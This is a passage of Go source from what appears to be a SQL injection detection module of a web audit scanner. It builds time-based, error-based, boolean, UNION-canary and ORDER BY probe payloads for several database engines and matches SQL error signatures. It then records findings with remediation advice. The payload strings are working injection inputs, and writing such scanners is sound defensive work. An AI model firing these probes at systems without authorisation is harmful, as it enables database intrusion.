				positive: base + " AND 1=LIKE('ABC',UPPER(HEX(RANDOMBLOB(" + strconv.Itoa(sqliteWorkUnits(delayMillis)) + "))))",
				control:  base + " AND 1=1"},
		}
	}
	return []timingCandidate{
		{dbms: "mysql", context: "string",
			positive: base + "' AND SLEEP(" + seconds + ")-- ",
			control:  base + "' AND SLEEP(0)-- "},
		{dbms: "mysql-benchmark", context: "string",
			positive: base + "' AND BENCHMARK(" + strconv.Itoa(benchmarkIterations(delayMillis)) + ",SHA2('auditcore',256))-- ",
			control:  base + "' AND BENCHMARK(1,SHA2('auditcore',256))-- "},
		{dbms: "postgresql", context: "string",
			positive: base + "' AND (SELECT pg_sleep(" + seconds + ")) IS NOT NULL-- ",
			control:  base + "' AND (SELECT pg_sleep(0)) IS NOT NULL-- "},
		{dbms: "mssql", context: "stacked-string",
			positive: base + "'; WAITFOR DELAY '0:0:" + seconds + "'-- ",
			control:  base + "'; WAITFOR DELAY '0:0:0'-- "},
		{dbms: "oracle", context: "string",
			positive: base + "' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a'," + oracleSeconds(delayMillis) + ") FROM dual)-- ",
			control:  base + "' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',0) FROM dual)-- "},
	}
}

func sqliteWorkUnits(delayMillis int) int {
	if delayMillis <= 0 {
		return 1000
	}
	units := delayMillis * 10
	if units < 1000 {
		units = 1000
	}
	if units > 100000 {
		units = 100000
	}
	return units
}

func benchmarkIterations(delayMillis int) int {
	if delayMillis <= 0 {
		return 1000
	}
	iterations := delayMillis * 100
	if iterations < 1000 {
		iterations = 1000
	}
	if iterations > 100000 {
		iterations = 100000
	}
	return iterations
}

func oracleSeconds(delayMillis int) string {
	s := delayMillis / 1000
	if s < 1 {
		s = 1 // DBMS_PIPE.RECEIVE_MESSAGE prend un entier de secondes
	}
	return strconv.Itoa(s)
}

func timingSampleCount(value, fallback int) int {
	if value <= 0 {
		return fallback
	}
	if value > 3 {
		return 3
	}
	return value
}

func timingDurations(exchanges []models.HTTPExchange) []int64 {
	var durations []int64
	for _, exchange := range exchanges {
		if exchange.Response != nil {
			durations = append(durations, exchange.Response.DurationMillis)
		}
	}
	return durations
}

func lastResponse(exchanges []models.HTTPExchange) *models.HTTPResponseRecord {
	for index := len(exchanges) - 1; index >= 0; index-- {
		if exchanges[index].Response != nil {
			response := *exchanges[index].Response
			return &response
		}
	}
	return nil
}

func timingStatistics(samples []int64) timingStats {
	if len(samples) == 0 {
		return timingStats{}
	}
	median := timingMedian(samples)
	deviations := make([]int64, 0, len(samples))
	for _, sample := range samples {
		deviations = append(deviations, int64(math.Abs(float64(sample)-median)))
	}
	return timingStats{Median: median, MAD: timingMedian(deviations)}
}

func timingMedian(samples []int64) float64 {
	if len(samples) == 0 {
		return 0
	}
	ordered := append([]int64(nil), samples...)
	sort.Slice(ordered, func(left, right int) bool { return ordered[left] < ordered[right] })
	middle := len(ordered) / 2
	if len(ordered)%2 == 1 {
		return float64(ordered[middle])
	}
	return float64(ordered[middle-1]+ordered[middle]) / 2
}

func finishTransportResult(result *models.ActiveTestResult, executor *active.Executor, err error) *models.ActiveTestResult {
	if errors.Is(err, context.Canceled) {
		result.Status = models.ActiveTestCancelled
	} else if errors.Is(err, context.DeadlineExceeded) {
		result.Status = models.ActiveTestTimeout
	} else {
		result.Status = models.ActiveTestFailed
	}
	result.Reason = "échange HTTP SQLi interrompu: " + err.Error()
	if executor != nil {
		result.RequestCount = executor.Requests()
		result.ResponseCount = executor.Responses()
		result.Executed = result.RequestCount > 0
		result.Analyzed = result.ResponseCount > 0
		if limit := executor.LimitReached(); limit != "" {
			result.LimitReached = limit
			result.Reason += "; limite " + limit
		}
	}
	return result
}

func finishEvidence(result *models.ActiveTestResult, executor *active.Executor, plan models.ActiveTestPlan, proof bool, timing ...*models.TimingEvidence) *models.ActiveTestResult {
	exchanges := executor.Exchanges()
	var tests []models.HTTPExchange
	var differences []models.ResponseDifference
	for _, exchange := range exchanges {
		if exchange.Kind == "baseline" {
			continue
		}
		tests = append(tests, exchange)
		differences = append(differences, executor.CompareExchange(exchange)...)
	}
	result.RequestCount = executor.Requests()
	result.ResponseCount = executor.Responses()
	result.Executed = result.RequestCount > 0
	result.Analyzed = result.ResponseCount > 0
	var timingEvidence *models.TimingEvidence
	if len(timing) > 0 {
		timingEvidence = timing[0]
	}
	validationRule := "comparaison différentielle baseline / contrôle vrai / contrôle faux avec reproduction"
	expected := "baseline stable, condition vraie équivalente à la baseline, condition fausse différente et reproductible"
	if timingEvidence != nil {
		validationRule += "; validation time-based statistique par médianes, MAD et reproduction"
		expected += "; une probe temporelle doit dépasser le contrôle neutre au-delà du seuil adaptatif"
	}
	result.Evidence = &models.ActiveEvidence{
		Expected:            expected,
		Observed:            result.Reason,
		Baseline:            executor.Baseline(),
		TestExchanges:       tests,
		Differences:         differences,
		ValidationRule:      validationRule,
		Confidence:          resultConfidence(result.Status),
		Reproductions:       reproductionCount(tests),
		MinimumProofReached: proof,
		Conclusion:          result.Reason,
		Timing:              timingEvidence,
	}
	return result
}

func resultConfidence(status models.ActiveTestStatus) models.Confidence {
	if status == models.ActiveTestConfirmed {
		return models.ConfidenceHigh
	}
	if status == models.ActiveTestInconclusive {
		return models.ConfidenceLow
	}
	return models.ConfidenceMedium
}

func reproductionCount(exchanges []models.HTTPExchange) int {
	count := 0
	for _, exchange := range exchanges {
		if strings.Contains(exchange.Label, "reproduction") || strings.Contains(exchange.Label, "reproduce") {
			count++
		}
	}
	return count
}

func lastExchange(exchanges []models.HTTPExchange, kind string) *models.HTTPExchange {
	for i := len(exchanges) - 1; i >= 0; i-- {
		if kind == "" || exchanges[i].Kind == kind {
			copyExchange := exchanges[i]
			return &copyExchange
		}
	}
	return nil
}

func sameResponse(left, right *models.HTTPExchange) bool {
	if left == nil || right == nil || left.Response == nil || right.Response == nil {
		return false
	}
	return left.Response.StatusCode == right.Response.StatusCode && left.Response.NormalizedHash == right.Response.NormalizedHash
}

var sqlErrorSignatures = []string{
	// ── MySQL / MariaDB ────────────────────────────────────────────────
	"you have an error in your sql syntax",
	"warning: mysql_",
	"mysql_fetch",
	"mysqli_",
	"supplied argument is not a valid mysql",
	"check the manual that corresponds to your mysql server version",
	"mariadb server version for the right syntax",
	"unknown column",
	"duplicate entry",
	"xpath syntax error",
	// ── PostgreSQL ─────────────────────────────────────────────────────
	"pg_query()",
	"pg_exec()",
	"postgresql query failed",
	"pg::syntaxerror",
	"syntax error at or near",
	"unterminated quoted string",
	"invalid input syntax for",
	"psycopg2.errors",
	// ── MSSQL ──────────────────────────────────────────────────────────
	"unclosed quotation mark",
	"incorrect syntax near",
	"microsoft sql native client",
	"microsoft ole db provider for sql server",
	"sqlserver jdbc driver",
	"sql server]",
	"conversion failed when converting",
	"the multi-part identifier",
	"quoted string not properly terminated",
	// ── Oracle ─────────────────────────────────────────────────────────
	"ora-00921",
	"ora-00933",
	"ora-00936",
	"ora-01756",
	"ora-01789",
	"ora-01722",
	"ora-00907",
	"oracle error",
	"oracle driver",
	"pls-",
	// ── SQLite ─────────────────────────────────────────────────────────
	"sqlite3.operationalerror",
	"sqlite3::sqlexception",
	"sqlite error",
	"sqlite_error",
	"near \"",
	// ── Génériques (ODBC / JDBC / Django / SQLAlchemy) ─────────────────
	"sqlstate[",
	"odbc driver",
	"jdbc.driver",
	"django.db.utils",
	"sqlalchemy.exc",
	"sql syntax error",
	"unexpected end of sql command",
}

func sqlErrorSignature(body string) string {
	lower := strings.ToLower(body)
	for _, signature := range sqlErrorSignatures {
		if strings.Contains(lower, signature) {
			return signature
		}
	}
	return ""
}

func buildActiveFinding(ctx *models.ModuleContext, param, payload, subType, reason string, exchange *models.HTTPExchange) *models.Finding {
	statusCode := 0
	body := ""
	requestLine := fmt.Sprintf("%s %s HTTP/1.1", ctx.Asset.Method, ctx.Asset.URL)
	if exchange != nil {
		requestLine = fmt.Sprintf("%s %s HTTP/1.1", exchange.Request.Method, exchange.Request.URL)
		if exchange.Response != nil {
			statusCode = exchange.Response.StatusCode
			body = exchange.Response.BodyPreview
		}
	}
	return &models.Finding{
		ID: uuid.NewString(), AuditRunID: ctx.AuditRunID, TaxonomyID: "WEB-SQLI-001", Type: subType,
		Title: fmt.Sprintf("SQL Injection (%s) - paramètre %q", subType, param), Severity: models.SeverityCritical,
		Confidence: models.ConfidenceHigh, Status: models.FindingConfirmed, CWE: "CWE-89", OWASPCat: "A03:2021",
		ASVSMapping: "V5.3.4", Description: fmt.Sprintf("Le paramètre %q de l'endpoint %s présente une différence SQLi reproductible. %s", param, ctx.Asset.URL, reason),
		Impact:      "Lecture, modification ou suppression de données en base selon les droits du compte applicatif.",
		Remediation: "Utiliser des requêtes paramétrées et ne jamais concaténer les entrées utilisateur dans les requêtes SQL.",
		Replayable:  true, Endpoint: ctx.Asset.URL, Parameter: param, CreatedAt: time.Now(),
		Evidence: &models.Evidence{ID: uuid.NewString(), RequestRaw: requestLine, ResponseRaw: fmt.Sprintf("HTTP/1.1 %d\n\n%s", statusCode, snip(body, 500)), Payload: payload, MatcherResult: reason},
	}
}

func (m *Module) Run(ctx *models.ModuleContext, client *http.Client) *models.ModuleResult {
	result := &models.ModuleResult{}

	// Tester uniquement les assets avec des paramètres suspects
	if len(ctx.Asset.Params) == 0 && !looksInjectable(ctx.Asset.URL) {
		return result
	}

	params := ctx.Asset.Params
	if len(params) == 0 {
		params = ExtractURLParams(ctx.Asset.URL)
	}
	if len(params) == 0 {
		params = []string{"id", "q", "search", "user", "name"}
	}

	for _, param := range params {
		// ── Error-based ────────────────────────────────────────────────
		found := false
		for _, payload := range errorPayloads {
			req, probeURL, err := NewProbeRequest(ctx.Asset, param, payload)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "AuditCore/2.0")

			resp, err := matchers.Fetch(client, req)
			if err != nil {
				continue
			}
			if evidence := sqlErrorSignature(resp.Body); evidence != "" {
				finding := buildFinding(ctx, param, payload, resp, evidence, "sqli-error-based", probeURL)
				finding.Status = models.FindingConfirmed
				finding.Confidence = models.ConfidenceHigh
				result.Findings = append(result.Findings, finding)
				found = true
				break
			}
		}
		if found {
			continue
		}

		// ── Boolean-based ──────────────────────────────────────────────
		for _, pair := range booleanPairs {
			trueReq, trueURL, err1 := NewProbeRequest(ctx.Asset, param, pair[0])
			falseReq, _, err2 := NewProbeRequest(ctx.Asset, param, pair[1])
			if err1 != nil || err2 != nil {
				continue
			}
			trueResp, fetchErr1 := matchers.Fetch(client, trueReq)
			falseResp, fetchErr2 := matchers.Fetch(client, falseReq)
			if fetchErr1 != nil || fetchErr2 != nil {
				continue
			}
			if hit, evidence := matchers.SQLiBoolean(trueResp, falseResp); hit {
				finding := buildFinding(ctx, param, pair[0], trueResp, evidence, "sqli-boolean-based", trueURL)
				finding.Status = models.FindingValidated
				finding.Confidence = models.ConfidenceMedium
				result.Findings = append(result.Findings, finding)
				found = true
				break
			}
		}
		if found {
			continue
		}

		// ── UNION-based (canary reflected) ─────────────────────────────
		unionCanary := "AUDIT-CANARY-" + strings.ReplaceAll(uuid.NewString(), "-", "")
		for _, probe := range unionProbes {
			if probe.canary == "order-probe" {
				continue
			}
			payload := strings.ReplaceAll(probe.payload, "AUDIT-CANARY-1", unionCanary)
			req, probeURL, err := NewProbeRequest(ctx.Asset, param, payload)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "AuditCore/2.0")
			resp, err := matchers.Fetch(client, req)
			if err != nil || resp == nil {
				continue
			}
			if !strings.Contains(resp.Body, unionCanary) {
				continue
			}
			// Reproduction pour éviter un faux positif.
			repReq, _, repErr := NewProbeRequest(ctx.Asset, param, payload)
			if repErr != nil {
				continue
			}
			repResp, repFetchErr := matchers.Fetch(client, repReq)
			if repFetchErr != nil || repResp == nil || !strings.Contains(repResp.Body, unionCanary) {
				continue
			}
			evidence := fmt.Sprintf("canari %q reflété via UNION SELECT (%d colonne(s))", unionCanary, probe.columns)
			finding := buildFinding(ctx, param, payload, repResp, evidence, "sqli-union-based", probeURL)
			finding.Status = models.FindingConfirmed
			finding.Confidence = models.ConfidenceHigh
			result.Findings = append(result.Findings, finding)
			found = true
			break
		}
		if found {
			continue
		}

		// ── ORDER BY fingerprint (comptage de colonnes) ────────────────
		orderCols := runPassiveOrderByFingerprint(ctx, client, param)
		if orderCols > 0 {
			// On enregistre comme indication (low confidence), pas comme confirmation.
			payload := fmt.Sprintf("' ORDER BY %d--", orderCols)
			req, probeURL, err := NewProbeRequest(ctx.Asset, param, payload)
			if err == nil {
				req.Header.Set("User-Agent", "AuditCore/2.0")
				if resp, fetchErr := matchers.Fetch(client, req); fetchErr == nil && resp != nil {
					evidence := fmt.Sprintf("ORDER BY %d accepté sans erreur (colonne(s) potentielle(s))", orderCols)
					finding := buildFinding(ctx, param, payload, resp, evidence, "sqli-order-by-fingerprint", probeURL)
					finding.Status = models.FindingValidated
					finding.Confidence = models.ConfidenceLow
					result.Findings = append(result.Findings, finding)
					found = true
				}
			}
		}
		if found {
			continue
		}

		// ── Time-based passif (MySQL SLEEP par défaut via timingPayloads) ─
		if hit, payload, probeURL, resp := runPassiveTimeBased(ctx, client, param); hit {
			evidence := "délai serveur reproductible après injection SLEEP()"
			finding := buildFinding(ctx, param, payload, resp, evidence, "sqli-time-based", probeURL)
			finding.Status = models.FindingValidated
			finding.Confidence = models.ConfidenceMedium
			result.Findings = append(result.Findings, finding)
		}
	}

	return result
}

// runPassiveOrderByFingerprint incrémente ORDER BY 1,2,3... jusqu'à trouver
// une erreur SQL ou un HTTP 5xx. Renvoie le dernier N accepté.
func runPassiveOrderByFingerprint(ctx *models.ModuleContext, client *http.Client, param string) int {
	const maxCols = 10
	lastValid := 0
	var baselineBody string
	if req, _, err := NewProbeRequest(ctx.Asset, param, "1"); err == nil {
		req.Header.Set("User-Agent", "AuditCore/2.0")
		if resp, err := matchers.Fetch(client, req); err == nil && resp != nil {
			baselineBody = resp.Body
		}
	}
	for column := 1; column <= maxCols; column++ {
		payload := fmt.Sprintf("' ORDER BY %d--", column)
		req, _, err := NewProbeRequest(ctx.Asset, param, payload)
		if err != nil {
			return lastValid
		}
		req.Header.Set("User-Agent", "AuditCore/2.0")
		resp, err := matchers.Fetch(client, req)
		if err != nil || resp == nil {
			return lastValid
		}
		if resp.StatusCode >= 500 || sqlErrorSignature(resp.Body) != "" {
			break
		}
		// Si la réponse est identique à la baseline pour toutes les colonnes,
		// on ne peut rien conclure -> pas de fingerprint.
		if column == 1 && resp.Body == baselineBody {
			// baseline stable, on continue quand même pour voir si ça casse plus loin
		}
		lastValid = column
	}
	return lastValid
}

// runPassiveTimeBased utilise timingPayloads (MySQL SLEEP par défaut) et
// mesure la latence. Deux échantillons positifs contre deux contrôles neutres.
func runPassiveTimeBased(ctx *models.ModuleContext, client *http.Client, param string) (bool, string, string, *matchers.Response) {
	const delayMillis = 1500
	positive, control, _ := timingPayloads("1", delayMillis)

	measure := func(payload string) (time.Duration, *matchers.Response, string, bool) {
		req, probeURL, err := NewProbeRequest(ctx.Asset, param, payload)
		if err != nil {
			return 0, nil, "", false
		}
		req.Header.Set("User-Agent", "AuditCore/2.0")
		start := time.Now()
		resp, err := matchers.Fetch(client, req)
		elapsed := time.Since(start)
		if err != nil || resp == nil {
			return elapsed, nil, probeURL, false
		}
		return elapsed, resp, probeURL, true
	}

	// Baseline / contrôle : 2 mesures
	var controlSum time.Duration
	controlOK := 0
	for i := 0; i < 2; i++ {
		if d, _, _, ok := measure(control); ok {
			controlSum += d
			controlOK++
		}
	}
	if controlOK == 0 {
		return false, "", "", nil
	}
	controlAvg := controlSum / time.Duration(controlOK)

	// Probe : 2 mesures ; on exige les 2 au-dessus du seuil
	threshold := controlAvg + time.Duration(float64(delayMillis)*0.7)*time.Millisecond
	hits := 0
	var lastResp *matchers.Response
	var lastURL string
	for i := 0; i < 2; i++ {
		d, resp, probeURL, ok := measure(positive)
		if !ok {
			return false, "", "", nil
		}
		if d >= threshold {
			hits++
			lastResp = resp
			lastURL = probeURL
		}
	}
	if hits >= 2 {
		return true, positive, lastURL, lastResp
	}
	return false, "", "", nil
}

func buildFinding(ctx *models.ModuleContext, param, payload string, resp *matchers.Response, matcherEvidence, subType, probeURL string) *models.Finding {
	return &models.Finding{
		ID:          uuid.NewString(),
		AuditRunID:  ctx.AuditRunID,
		TaxonomyID:  "WEB-SQLI-001",
		Type:        subType,
		Title:       fmt.Sprintf("SQL Injection (%s) — paramètre %q", subType, param),
		Severity:    models.SeverityCritical,
		CWE:         "CWE-89",
		OWASPCat:    "A03:2021",
		ASVSMapping: "V5.3.4",
		Description: fmt.Sprintf("Le paramètre %q de l'endpoint %s est vulnérable à l'injection SQL (%s). Pattern détecté : %s", param, ctx.Asset.URL, subType, matcherEvidence),
		Impact:      "Lecture, modification ou suppression de données en base. Possible escalade vers RCE selon la configuration du SGBD.",
		Remediation: "Utiliser des requêtes paramétrées (prepared statements) ou un ORM avec auto-escaping. Ne jamais interpoler des entrées utilisateur dans des requêtes SQL.",
		Replayable:  true,
		Endpoint:    probeURL,
		Parameter:   param,
		CreatedAt:   time.Now(),
		Evidence: &models.Evidence{
			ID:            uuid.NewString(),
			RequestRaw:    fmt.Sprintf("GET %s HTTP/1.1\nUser-Agent: AuditCore/2.0", probeURL),
			ResponseRaw:   fmt.Sprintf("HTTP/1.1 %d\n\n%s", resp.StatusCode, snip(resp.Body, 500)),
			Payload:       payload,
			MatcherResult: matcherEvidence,
		},
	}
}

func looksInjectable(u string) bool {
	return strings.Contains(u, "?") || strings.Contains(u, "id=") || strings.Contains(u, "search=")
}

// ExtractURLParams extrait les noms de paramètres GET d'une URL.
func ExtractURLParams(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range u.Query() {
		params = append(params, k)
	}
	return params
}

// InjectParam injecte une valeur dans un paramètre GET d'une URL.
func InjectParam(baseURL, param, payload string) string {
	u, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

func NewProbeRequest(asset *models.Asset, param, payload string) (*http.Request, string, error) {
	location := models.EntryPointQuery
	bodyType := strings.ToLower(asset.BodyType)
	if asset.Type == models.AssetForm || strings.EqualFold(asset.Method, http.MethodPost) || strings.EqualFold(asset.Method, http.MethodPut) || strings.EqualFold(asset.Method, http.MethodPatch) {
		location = models.EntryPointForm
		if strings.Contains(bodyType, "json") || strings.Contains(bodyType, "graphql") {
			location = models.EntryPointJSON
		} else if strings.Contains(bodyType, "xml") {
			location = models.EntryPointXML
		} else if strings.Contains(bodyType, "multipart") {
			location = models.EntryPointMultipart
		}
	}
	entry := models.EntryPoint{Endpoint: asset.URL, Method: asset.Method, Name: param, Location: location, OriginalValue: "", BodyType: asset.BodyType}
	req, err := active.BuildProbeRequest(asset, entry, payload)
	if err != nil {
		return nil, "", err
	}
	probeURL := asset.URL
	if location == models.EntryPointQuery || location == models.EntryPointPath {
		probeURL = req.URL.String()
	} else {
		// Body-based : on expose au moins une forme replay-friendly via query.
		probeURL = InjectParam(asset.URL, param, payload)
	}
	return req, probeURL, nil
}

func snip(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
